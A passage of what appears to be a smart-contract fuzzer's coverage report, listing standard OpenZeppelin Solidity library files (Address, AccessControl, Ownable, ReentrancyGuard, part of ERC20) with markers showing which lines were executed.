    |     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    |         return functionCall(target, data, "Address: low-level call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
    |      * `errorMessage` as a fallback revert reason when `target` reverts.
    |      *
    |      * _Available since v3.1._
    |      */
    |     function functionCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
    |     ) internal returns (bytes memory) {
    |         return functionCallWithValue(target, data, 0, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but also transferring `value` wei to `target`.
    |      *
    |      * Requirements:
    |      *
    |      * - the calling contract must have an ETH balance of at least `value`.
    |      * - the called Solidity function must be `payable`.
    |      *
    |      * _Available since v3.1._
    |      */
    |     function functionCallWithValue(
    |         address target,
    |         bytes memory data,
    |         uint256 value
    |     ) internal returns (bytes memory) {
    |         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
    |      * with `errorMessage` as a fallback revert reason when `target` reverts.
    |      *
    |      * _Available since v3.1._
    |      */
    |     function functionCallWithValue(
    |         address target,
    |         bytes memory data,
    |         uint256 value,
    |         string memory errorMessage
    |     ) internal returns (bytes memory) {
    |         require(address(this).balance >= value, "Address: insufficient balance for call");
    |         require(isContract(target), "Address: call to non-contract");
    | 
    |         (bool success, bytes memory returndata) = target.call{value: value}(data);
    |         return verifyCallResult(success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but performing a static call.
    |      *
    |      * _Available since v3.3._
    |      */
    |     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
    |         return functionStaticCall(target, data, "Address: low-level static call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
    |      * but performing a static call.
    |      *
    |      * _Available since v3.3._
    |      */
    |     function functionStaticCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
    |     ) internal view returns (bytes memory) {
    |         require(isContract(target), "Address: static call to non-contract");
    | 
    |         (bool success, bytes memory returndata) = target.staticcall(data);
    |         return verifyCallResult(success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
    |      * revert reason using the provided one.
    |      *
    |      * _Available since v4.3._
    |      */
    |     function verifyCallResult(
    |         bool success,
    |         bytes memory returndata,
    |         string memory errorMessage
    |     ) internal pure returns (bytes memory) {
    |         if (success) {
    |             return returndata;
    |         } else {
    |             // Look for revert reason and bubble it up if present
    |             if (returndata.length > 0) {
    |                 // The easiest way to bubble the revert reason is using memory via assembly
    | 
    |                 assembly {
    |                     let returndata_size := mload(returndata)
    |                     revert(add(32, returndata), returndata_size)
    |                 }
    |             } else {
    |                 revert(errorMessage);
    |             }
    |         }
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | import "../proxy/utils/Initializable.sol";
    | 
    | /**
    |  * @dev Provides information about the current execution context, including the
    |  * sender of the transaction and its data. While these are generally available
    |  * via msg.sender and msg.data, they should not be accessed in such a direct
    |  * manner, since when dealing with meta-transactions the account sending and
    |  * paying for execution may not be the actual sender (as far as an application
    |  * is concerned).
    |  *
    |  * This contract is only required for intermediate, library-like contracts.
    |  */
    | abstract contract ContextUpgradeable is Initializable {
    |     function __Context_init() internal initializer {
    |         __Context_init_unchained();
    |     }
    | 
    |     function __Context_init_unchained() internal initializer {
    |     }
    |     function _msgSender() internal view virtual returns (address) {
    |         return msg.sender;
    |     }
    | 
    |     function _msgData() internal view virtual returns (bytes calldata) {
    |         return msg.data;
    |     }
    |     uint256[50] private __gap;
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/utils/StorageSlotUpgradeable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Library for reading and writing primitive types to specific storage slots.
    |  *
    |  * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.
    |  * This library helps with reading and writing to such slots without the need for inline assembly.
    |  *
    |  * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.
    |  *
    |  * Example usage to set ERC1967 implementation slot:
    |  * ```
    |  * contract ERC1967 {
    |  *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    |  *
    |  *     function _getImplementation() internal view returns (address) {
    |  *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
    |  *     }
    |  *
    |  *     function _setImplementation(address newImplementation) internal {
    |  *         require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
    |  *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
    |  *     }
    |  * }
    |  * ```
    |  *
    |  * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._
    |  */
    | library StorageSlotUpgradeable {
    |     struct AddressSlot {
    |         address value;
    |     }
    | 
    |     struct BooleanSlot {
    |         bool value;
    |     }
    | 
    |     struct Bytes32Slot {
    |         bytes32 value;
    |     }
    | 
    |     struct Uint256Slot {
    |         uint256 value;
    |     }
    | 
    |     /**
    |      * @dev Returns an `AddressSlot` with member `value` located at `slot`.
    |      */
    |     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
    |         assembly {
    |             r.slot := slot
    |         }
    |     }
    | 
    |     /**
    |      * @dev Returns an `BooleanSlot` with member `value` located at `slot`.
    |      */
    |     function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {
    |         assembly {
    |             r.slot := slot
    |         }
    |     }
    | 
    |     /**
    |      * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.
    |      */
    |     function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {
    |         assembly {
    |             r.slot := slot
    |         }
    |     }
    | 
    |     /**
    |      * @dev Returns an `Uint256Slot` with member `value` located at `slot`.
    |      */
    |     function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {
    |         assembly {
    |             r.slot := slot
    |         }
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/access/AccessControl.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./IAccessControl.sol";
    | import "../utils/Context.sol";
    | import "../utils/Strings.sol";
    | import "../utils/introspection/ERC165.sol";
    | 
    | /**
    |  * @dev Contract module that allows children to implement role-based access
    |  * control mechanisms. This is a lightweight version that doesn't allow enumerating role
    |  * members except through off-chain means by accessing the contract event logs. Some
    |  * applications may benefit from on-chain enumerability, for those cases see
    |  * {AccessControlEnumerable}.
    |  *
    |  * Roles are referred to by their `bytes32` identifier. These should be exposed
    |  * in the external API and be unique. The best way to achieve this is by
    |  * using `public constant` hash digests:
    |  *
    |  * ```
    |  * bytes32 public constant MY_ROLE = keccak256("MY_ROLE");
    |  * ```
    |  *
    |  * Roles can be used to represent a set of permissions. To restrict access to a
    |  * function call, use {hasRole}:
    |  *
    |  * ```
    |  * function foo() public {
    |  *     require(hasRole(MY_ROLE, msg.sender));
    |  *     ...
    |  * }
    |  * ```
    |  *
    |  * Roles can be granted and revoked dynamically via the {grantRole} and
    |  * {revokeRole} functions. Each role has an associated admin role, and only
    |  * accounts that have a role's admin role can call {grantRole} and {revokeRole}.
    |  *
    |  * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means
    |  * that only accounts with this role will be able to grant or revoke other
    |  * roles. More complex role relationships can be created by using
    |  * {_setRoleAdmin}.
    |  *
    |  * WARNING: The `DEFAULT_ADMIN_ROLE` is also its own admin: it has permission to
    |  * grant and revoke this role. Extra precautions should be taken to secure
    |  * accounts that have been granted it.
    |  */
    | abstract contract AccessControl is Context, IAccessControl, ERC165 {
    |     struct RoleData {
    |         mapping(address => bool) members;
    |         bytes32 adminRole;
    |     }
    | 
    |     mapping(bytes32 => RoleData) private _roles;
    | 
    |     bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    | 
    |     /**
    |      * @dev Modifier that checks that an account has a specific role. Reverts
    |      * with a standardized message including the required role.
    |      *
    |      * The format of the revert reason is given by the following regular expression:
    |      *
    |      *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
    |      *
    |      * _Available since v4.1._
    |      */
    |     modifier onlyRole(bytes32 role) {
    |         _checkRole(role, _msgSender());
    |         _;
    |     }
    | 
    |     /**
    |      * @dev See {IERC165-supportsInterface}.
    |      */
    |     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
    |         return interfaceId == type(IAccessControl).interfaceId || super.supportsInterface(interfaceId);
    |     }
    | 
    |     /**
    |      * @dev Returns `true` if `account` has been granted `role`.
    |      */
    |     function hasRole(bytes32 role, address account) public view override returns (bool) {
    |         return _roles[role].members[account];
    |     }
    | 
    |     /**
    |      * @dev Revert with a standard message if `account` is missing `role`.
    |      *
    |      * The format of the revert reason is given by the following regular expression:
    |      *
    |      *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
    |      */
    |     function _checkRole(bytes32 role, address account) internal view {
    |         if (!hasRole(role, account)) {
    |             revert(
    |                 string(
    |                     abi.encodePacked(
    |                         "AccessControl: account ",
    |                         Strings.toHexString(uint160(account), 20),
    |                         " is missing role ",
    |                         Strings.toHexString(uint256(role), 32)
    |                     )
    |                 )
    |             );
    |         }
    |     }
    | 
    |     /**
    |      * @dev Returns the admin role that controls `role`. See {grantRole} and
    |      * {revokeRole}.
    |      *
    |      * To change a role's admin, use {_setRoleAdmin}.
    |      */
    |     function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
    |         return _roles[role].adminRole;
    |     }
    | 
    |     /**
    |      * @dev Grants `role` to `account`.
    |      *
    |      * If `account` had not been already granted `role`, emits a {RoleGranted}
    |      * event.
    |      *
    |      * Requirements:
    |      *
    |      * - the caller must have ``role``'s admin role.
    |      */
    |     function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
    |         _grantRole(role, account);
    |     }
    | 
    |     /**
    |      * @dev Revokes `role` from `account`.
    |      *
    |      * If `account` had been granted `role`, emits a {RoleRevoked} event.
    |      *
    |      * Requirements:
    |      *
    |      * - the caller must have ``role``'s admin role.
    |      */
    |     function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
    |         _revokeRole(role, account);
    |     }
    | 
    |     /**
    |      * @dev Revokes `role` from the calling account.
    |      *
    |      * Roles are often managed via {grantRole} and {revokeRole}: this function's
    |      * purpose is to provide a mechanism for accounts to lose their privileges
    |      * if they are compromised (such as when a trusted device is misplaced).
    |      *
    |      * If the calling account had been granted `role`, emits a {RoleRevoked}
    |      * event.
    |      *
    |      * Requirements:
    |      *
    |      * - the caller must be `account`.
    |      */
    |     function renounceRole(bytes32 role, address account) public virtual override {
    |         require(account == _msgSender(), "AccessControl: can only renounce roles for self");
    | 
    |         _revokeRole(role, account);
    |     }
    | 
    |     /**
    |      * @dev Grants `role` to `account`.
    |      *
    |      * If `account` had not been already granted `role`, emits a {RoleGranted}
    |      * event. Note that unlike {grantRole}, this function doesn't perform any
    |      * checks on the calling account.
    |      *
    |      * [WARNING]
    |      * ====
    |      * This function should only be called from the constructor when setting
    |      * up the initial roles for the system.
    |      *
    |      * Using this function in any other way is effectively circumventing the admin
    |      * system imposed by {AccessControl}.
    |      * ====
    |      */
    |     function _setupRole(bytes32 role, address account) internal virtual {
    |         _grantRole(role, account);
    |     }
    | 
    |     /**
    |      * @dev Sets `adminRole` as ``role``'s admin role.
    |      *
    |      * Emits a {RoleAdminChanged} event.
    |      */
    |     function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
    |         bytes32 previousAdminRole = getRoleAdmin(role);
    |         _roles[role].adminRole = adminRole;
    |         emit RoleAdminChanged(role, previousAdminRole, adminRole);
    |     }
    | 
    |     function _grantRole(bytes32 role, address account) private {
    |         if (!hasRole(role, account)) {
    |             _roles[role].members[account] = true;
    |             emit RoleGranted(role, account, _msgSender());
    |         }
    |     }
    | 
    |     function _revokeRole(bytes32 role, address account) private {
    |         if (hasRole(role, account)) {
    |             _roles[role].members[account] = false;
    |             emit RoleRevoked(role, account, _msgSender());
    |         }
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/access/AccessControlEnumerable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./IAccessControlEnumerable.sol";
    | import "./AccessControl.sol";
    | import "../utils/structs/EnumerableSet.sol";
    | 
    | /**
    |  * @dev Extension of {AccessControl} that allows enumerating the members of each role.
    |  */
    | abstract contract AccessControlEnumerable is IAccessControlEnumerable, AccessControl {
    |     using EnumerableSet for EnumerableSet.AddressSet;
    | 
    |     mapping(bytes32 => EnumerableSet.AddressSet) private _roleMembers;
    | 
    |     /**
    |      * @dev See {IERC165-supportsInterface}.
    |      */
    |     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
    |         return interfaceId == type(IAccessControlEnumerable).interfaceId || super.supportsInterface(interfaceId);
    |     }
    | 
    |     /**
    |      * @dev Returns one of the accounts that have `role`. `index` must be a
    |      * value between 0 and {getRoleMemberCount}, non-inclusive.
    |      *
    |      * Role bearers are not sorted in any particular way, and their ordering may
    |      * change at any point.
    |      *
    |      * WARNING: When using {getRoleMember} and {getRoleMemberCount}, make sure
    |      * you perform all queries on the same block. See the following
    |      * https://forum.openzeppelin.com/t/iterating-over-elements-on-enumerableset-in-openzeppelin-contracts/2296[forum post]
    |      * for more information.
    |      */
    |     function getRoleMember(bytes32 role, uint256 index) public view override returns (address) {
    |         return _roleMembers[role].at(index);
    |     }
    | 
    |     /**
    |      * @dev Returns the number of accounts that have `role`. Can be used
    |      * together with {getRoleMember} to enumerate all bearers of a role.
    |      */
    |     function getRoleMemberCount(bytes32 role) public view override returns (uint256) {
    |         return _roleMembers[role].length();
    |     }
    | 
    |     /**
    |      * @dev Overload {grantRole} to track enumerable memberships
    |      */
    |     function grantRole(bytes32 role, address account) public virtual override(AccessControl, IAccessControl) {
    |         super.grantRole(role, account);
    |         _roleMembers[role].add(account);
    |     }
    | 
    |     /**
    |      * @dev Overload {revokeRole} to track enumerable memberships
    |      */
    |     function revokeRole(bytes32 role, address account) public virtual override(AccessControl, IAccessControl) {
    |         super.revokeRole(role, account);
    |         _roleMembers[role].remove(account);
    |     }
    | 
    |     /**
    |      * @dev Overload {renounceRole} to track enumerable memberships
    |      */
    |     function renounceRole(bytes32 role, address account) public virtual override(AccessControl, IAccessControl) {
    |         super.renounceRole(role, account);
    |         _roleMembers[role].remove(account);
    |     }
    | 
    |     /**
    |      * @dev Overload {_setupRole} to track enumerable memberships
    |      */
    |     function _setupRole(bytes32 role, address account) internal virtual override {
    |         super._setupRole(role, account);
    |         _roleMembers[role].add(account);
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/access/IAccessControl.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev External interface of AccessControl declared to support ERC165 detection.
    |  */
    | interface IAccessControl {
    |     /**
    |      * @dev Emitted when `newAdminRole` is set as ``role``'s admin role, replacing `previousAdminRole`
    |      *
    |      * `DEFAULT_ADMIN_ROLE` is the starting admin for all roles, despite
    |      * {RoleAdminChanged} not being emitted signaling this.
    |      *
    |      * _Available since v3.1._
    |      */
    |     event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
    | 
    |     /**
    |      * @dev Emitted when `account` is granted `role`.
    |      *
    |      * `sender` is the account that originated the contract call, an admin role
    |      * bearer except when using {AccessControl-_setupRole}.
    |      */
    |     event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    | 
    |     /**
    |      * @dev Emitted when `account` is revoked `role`.
    |      *
    |      * `sender` is the account that originated the contract call:
    |      *   - if using `revokeRole`, it is the admin role bearer
    |      *   - if using `renounceRole`, it is the role bearer (i.e. `account`)
    |      */
    |     event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
    | 
    |     /**
    |      * @dev Returns `true` if `account` has been granted `role`.
    |      */
    |     function hasRole(bytes32 role, address account) external view returns (bool);
    | 
    |     /**
    |      * @dev Returns the admin role that controls `role`. See {grantRole} and
    |      * {revokeRole}.
    |      *
    |      * To change a role's admin, use {AccessControl-_setRoleAdmin}.
    |      */
    |     function getRoleAdmin(bytes32 role) external view returns (bytes32);
    | 
    |     /**
    |      * @dev Grants `role` to `account`.
    |      *
    |      * If `account` had not been already granted `role`, emits a {RoleGranted}
    |      * event.
    |      *
    |      * Requirements:
    |      *
    |      * - the caller must have ``role``'s admin role.
    |      */
    |     function grantRole(bytes32 role, address account) external;
    | 
    |     /**
    |      * @dev Revokes `role` from `account`.
    |      *
    |      * If `account` had been granted `role`, emits a {RoleRevoked} event.
    |      *
    |      * Requirements:
    |      *
    |      * - the caller must have ``role``'s admin role.
    |      */
    |     function revokeRole(bytes32 role, address account) external;
    | 
    |     /**
    |      * @dev Revokes `role` from the calling account.
    |      *
    |      * Roles are often managed via {grantRole} and {revokeRole}: this function's
    |      * purpose is to provide a mechanism for accounts to lose their privileges
    |      * if they are compromised (such as when a trusted device is misplaced).
    |      *
    |      * If the calling account had been granted `role`, emits a {RoleRevoked}
    |      * event.
    |      *
    |      * Requirements:
    |      *
    |      * - the caller must be `account`.
    |      */
    |     function renounceRole(bytes32 role, address account) external;
    | }
    | 

/src/node_modules/@openzeppelin/contracts/access/IAccessControlEnumerable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./IAccessControl.sol";
    | 
    | /**
    |  * @dev External interface of AccessControlEnumerable declared to support ERC165 detection.
    |  */
    | interface IAccessControlEnumerable is IAccessControl {
    |     /**
    |      * @dev Returns one of the accounts that have `role`. `index` must be a
    |      * value between 0 and {getRoleMemberCount}, non-inclusive.
    |      *
    |      * Role bearers are not sorted in any particular way, and their ordering may
    |      * change at any point.
    |      *
    |      * WARNING: When using {getRoleMember} and {getRoleMemberCount}, make sure
    |      * you perform all queries on the same block. See the following
    |      * https://forum.openzeppelin.com/t/iterating-over-elements-on-enumerableset-in-openzeppelin-contracts/2296[forum post]
    |      * for more information.
    |      */
    |     function getRoleMember(bytes32 role, uint256 index) external view returns (address);
    | 
    |     /**
    |      * @dev Returns the number of accounts that have `role`. Can be used
    |      * together with {getRoleMember} to enumerate all bearers of a role.
    |      */
    |     function getRoleMemberCount(bytes32 role) external view returns (uint256);
    | }
    | 

/src/node_modules/@openzeppelin/contracts/access/Ownable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../utils/Context.sol";
    | 
    | /**
    |  * @dev Contract module which provides a basic access control mechanism, where
    |  * there is an account (an owner) that can be granted exclusive access to
    |  * specific functions.
    |  *
    |  * By default, the owner account will be the one that deploys the contract. This
    |  * can later be changed with {transferOwnership}.
    |  *
    |  * This module is used through inheritance. It will make available the modifier
    |  * `onlyOwner`, which can be applied to your functions to restrict their use to
    |  * the owner.
    |  */
    | abstract contract Ownable is Context {
    |     address private _owner;
    | 
    |     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    | 
    |     /**
    |      * @dev Initializes the contract setting the deployer as the initial owner.
    |      */
    |     constructor() {
    |         _setOwner(_msgSender());
    |     }
    | 
    |     /**
    |      * @dev Returns the address of the current owner.
    |      */
    |     function owner() public view virtual returns (address) {
    |         return _owner;
    |     }
    | 
    |     /**
    |      * @dev Throws if called by any account other than the owner.
    |      */
    |     modifier onlyOwner() {
    |         require(owner() == _msgSender(), "Ownable: caller is not the owner");
    |         _;
    |     }
    | 
    |     /**
    |      * @dev Leaves the contract without owner. It will not be possible to call
    |      * `onlyOwner` functions anymore. Can only be called by the current owner.
    |      *
    |      * NOTE: Renouncing ownership will leave the contract without an owner,
    |      * thereby removing any functionality that is only available to the owner.
    |      */
    |     function renounceOwnership() public virtual onlyOwner {
    |         _setOwner(address(0));
    |     }
    | 
    |     /**
    |      * @dev Transfers ownership of the contract to a new account (`newOwner`).
    |      * Can only be called by the current owner.
    |      */
    |     function transferOwnership(address newOwner) public virtual onlyOwner {
    |         require(newOwner != address(0), "Ownable: new owner is the zero address");
    |         _setOwner(newOwner);
    |     }
    | 
    |     function _setOwner(address newOwner) private {
    |         address oldOwner = _owner;
    |         _owner = newOwner;
    |         emit OwnershipTransferred(oldOwner, newOwner);
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/security/ReentrancyGuard.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Contract module that helps prevent reentrant calls to a function.
    |  *
    |  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
    |  * available, which can be applied to functions to make sure there are no nested
    |  * (reentrant) calls to them.
    |  *
    |  * Note that because there is a single `nonReentrant` guard, functions marked as
    |  * `nonReentrant` may not call one another. This can be worked around by making
    |  * those functions `private`, and then adding `external` `nonReentrant` entry
    |  * points to them.
    |  *
    |  * TIP: If you would like to learn more about reentrancy and alternative ways
    |  * to protect against it, check out our blog post
    |  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
    |  */
    | abstract contract ReentrancyGuard {
    |     // Booleans are more expensive than uint256 or any type that takes up a full
    |     // word because each write operation emits an extra SLOAD to first read the
    |     // slot's contents, replace the bits taken up by the boolean, and then write
    |     // back. This is the compiler's defense against contract upgrades and
    |     // pointer aliasing, and it cannot be disabled.
    | 
    |     // The values being non-zero value makes deployment a bit more expensive,
    |     // but in exchange the refund on every call to nonReentrant will be lower in
    |     // amount. Since refunds are capped to a percentage of the total
    |     // transaction's gas, it is best to keep them low in cases like this one, to
    |     // increase the likelihood of the full refund coming into effect.
r   |     uint256 private constant _NOT_ENTERED = 1;
r   |     uint256 private constant _ENTERED = 2;
    | 
    |     uint256 private _status;
    | 
    |     constructor() {
    |         _status = _NOT_ENTERED;
    |     }
    | 
    |     /**
    |      * @dev Prevents a contract from calling itself, directly or indirectly.
    |      * Calling a `nonReentrant` function from another `nonReentrant`
    |      * function is not supported. It is possible to prevent this from happening
    |      * by making the `nonReentrant` function external, and make it call a
    |      * `private` function that does the actual work.
    |      */
    |     modifier nonReentrant() {
    |         // On the first call to nonReentrant, _notEntered will be true
r   |         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
    | 
    |         // Any calls to nonReentrant after this point will fail
r   |         _status = _ENTERED;
    | 
    |         _;
    | 
    |         // By storing the original value once again, a refund is triggered (see
    |         // https://eips.ethereum.org/EIPS/eip-2200)
r   |         _status = _NOT_ENTERED;
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./IERC20.sol";
    | import "./extensions/IERC20Metadata.sol";
    | import "../../utils/Context.sol";
    | 
    | /**
    |  * @dev Implementation of the {IERC20} interface.
    |  *
    |  * This implementation is agnostic to the way tokens are created. This means
    |  * that a supply mechanism has to be added in a derived contract using {_mint}.
    |  * For a generic mechanism see {ERC20PresetMinterPauser}.
    |  *
    |  * TIP: For a detailed writeup see our guide
    |  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
    |  * to implement supply mechanisms].
    |  *
    |  * We have followed general OpenZeppelin Contracts guidelines: functions revert
    |  * instead returning `false` on failure. This behavior is nonetheless
    |  * conventional and does not conflict with the expectations of ERC20
    |  * applications.
    |  *
    |  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
    |  * This allows applications to reconstruct the allowance for all accounts just
    |  * by listening to said events. Other implementations of the EIP may not emit
    |  * these events, as it isn't required by the specification.
    |  *
    |  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
    |  * functions have been added to mitigate the well-known issues around setting
    |  * allowances. See {IERC20-approve}.
    |  */
    | contract ERC20 is Context, IERC20, IERC20Metadata {
    |     mapping(address => uint256) private _balances;
    | 
    |     mapping(address => mapping(address => uint256)) private _allowances;
    | 
    |     uint256 private _totalSupply;
    | 
    |     string private _name;
    |     string private _symbol;
    | 
    |     /**
    |      * @dev Sets the values for {name} and {symbol}.
    |      *
    |      * The default value of {decimals} is 18. To select a different value for
    |      * {decimals} you should overload it.
    |      *
    |      * All two of these values are immutable: they can only be set once during
    |      * construction.
    |      */
    |     constructor(string memory name_, string memory symbol_) {
    |         _name = name_;
    |         _symbol = symbol_;
    |     }
    | 
    |     /**
    |      * @dev Returns the name of the token.
    |      */
*   |     function name() public view virtual override returns (string memory) {
*   |         return _name;
    |     }
    | 
    |     /**
    |      * @dev Returns the symbol of the token, usually a shorter version of the
    |      * name.
    |      */
*   |     function symbol() public view virtual override returns (string memory) {
*   |         return _symbol;
    |     }
    | 
    |     /**
    |      * @dev Returns the number of decimals used to get its user representation.
    |      * For example, if `decimals` equals `2`, a balance of `505` tokens should
    |      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
    |      *
    |      * Tokens usually opt for a value of 18, imitating the relationship between
    |      * Ether and Wei. This is the value {ERC20} uses, unless this function is
    |      * overridden;
    |      *
    |      * NOTE: This information is only used for _display_ purposes: it in
    |      * no way affects any of the arithmetic of the contract, including
    |      * {IERC20-balanceOf} and {IERC20-transfer}.
    |      */
*   |     function decimals() public view virtual override returns (uint8) {
*   |         return 18;
    |     }
    | 
    |     /**
    |      * @dev See {IERC20-totalSupply}.
    |      */
*   |     function totalSupply() public view virtual override returns (uint256) {
*   |         return _totalSupply;
    |     }
    | 
    |     /**
    |      * @dev See {IERC20-balanceOf}.
    |      */
*r  |     function balanceOf(address account) public view virtual override returns (uint256) {
*r  |         return _balances[account];
    |     }
    | 
    |     /**
    |      * @dev See {IERC20-transfer}.
    |      *
    |      * Requirements:
    |      *
    |      * - `recipient` cannot be the zero address.
    |      * - the caller must have a balance of at least `amount`.
    |      */
*r  |     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
*r  |         _transfer(_msgSender(), recipient, amount);
*r  |         return true;
    |     }
    | 
    |     /**
    |      * @dev See {IERC20-allowance}.
    |      */
*   |     function allowance(address owner, address spender) public view virtual override returns (uint256) {
*   |         return _allowances[owner][spender];
    |     }
    | 
    |     /**
    |      * @dev See {IERC20-approve}.
    |      *
    |      * Requirements:
    |      *
    |      * - `spender` cannot be the zero address.
    |      */
*r  |     function approve(address spender, uint256 amount) public virtual override returns (bool) {
*r  |         _approve(_msgSender(), spender, amount);
*r  |         return true;
    |     }
    | 
    |     /**
    |      * @dev See {IERC20-transferFrom}.
    |      *
    |      * Emits an {Approval} event indicating the updated allowance. This is not
    |      * required by the EIP. See the note at the beginning of {ERC20}.
    |      *
    |      * Requirements:
    |      *
    |      * - `sender` and `recipient` cannot be the zero address.
    |      * - `sender` must have a balance of at least `amount`.
    |      * - the caller must have allowance for ``sender``'s tokens of at least
    |      * `amount`.
    |      */
*r  |     function transferFrom(
    |         address sender,
    |         address recipient,
    |         uint256 amount
*r  |     ) public virtual override returns (bool) {
*r  |         _transfer(sender, recipient, amount);
    | 
*r  |         uint256 currentAllowance = _allowances[sender][_msgSender()];
*r  |         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
    |         unchecked {
*r  |             _approve(sender, _msgSender(), currentAllowance - amount);
    |         }
    | 
*r  |         return true;
    |     }
    | 
    |     /**
    |      * @dev Atomically increases the allowance granted to `spender` by the caller.
    |      *
    |      * This is an alternative to {approve} that can be used as a mitigation for
    |      * problems described in {IERC20-approve}.
    |      *
    |      * Emits an {Approval} event indicating the updated allowance.
    |      *
    |      * Requirements:
    |      *
    |      * - `spender` cannot be the zero address.
    |      */
*r  |     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
*r  |         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
*   |         return true;
    |     }
    | 
    |     /**
    |      * @dev Atomically decreases the allowance granted to `spender` by the caller.
    |      *
    |      * This is an alternative to {approve} that can be used as a mitigation for
    |      * problems described in {IERC20-approve}.
    |      *
    |      * Emits an {Approval} event indicating the updated allowance.
    |      *
    |      * Requirements:
    |      *
    |      * - `spender` cannot be the zero address.
    |      * - `spender` must have allowance for the caller of at least
    |      * `subtractedValue`.
    |      */
*r  |     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
*r  |         uint256 currentAllowance = _allowances[_msgSender()][spender];
*r  |         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    |         unchecked {
*   |             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
    |         }
    | 
*   |         return true;
    |     }
    | 
    |     /**
    |      * @dev Moves `amount` of tokens from `sender` to `recipient`.
    |      *
    |      * This internal function is equivalent to {transfer}, and can be used to
    |      * e.g. implement automatic token fees, slashing mechanisms, etc.
    |      *
    |      * Emits a {Transfer} event.
    |      *
    |      * Requirements:
    |      *
    |      * - `sender` cannot be the zero address.
    |      * - `recipient` cannot be the zero address.
    |      * - `sender` must have a balance of at least `amount`.
    |      */
*r  |     function _transfer(
    |         address sender,
    |         address recipient,
    |         uint256 amount
*r  |     ) internal virtual {
*r  |         require(sender != address(0), "ERC20: transfer from the zero address");
*r  |         require(recipient != address(0), "ERC20: transfer to the zero address");
    | 
